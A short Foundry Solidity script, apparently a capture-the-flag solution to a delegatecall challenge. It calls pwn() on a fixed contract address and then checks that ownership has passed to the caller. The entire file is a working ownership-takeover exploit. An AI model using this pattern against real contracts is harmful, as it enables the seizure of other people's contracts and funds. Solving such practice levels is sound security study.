// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

contract Solve is Script, Test {
  address target = 0x94360dD57ac813Bca54E94e9D3aCB3c71BB8Ee9B;

  function run() public {
    vm.startBroadcast();

    (bool success, ) = target.call(abi.encodeWithSignature("pwn()"));
    require(success, "Delegation call failed");

    (, bytes memory ownerData) = target.call(abi.encodeWithSignature("owner()"));
    address newOwner = abi.decode(ownerData, (address));
    console.log("New owner is %s", newOwner);
    require(newOwner == msg.sender, "Owner was not set correctly");

    vm.stopBroadcast();
  }
}
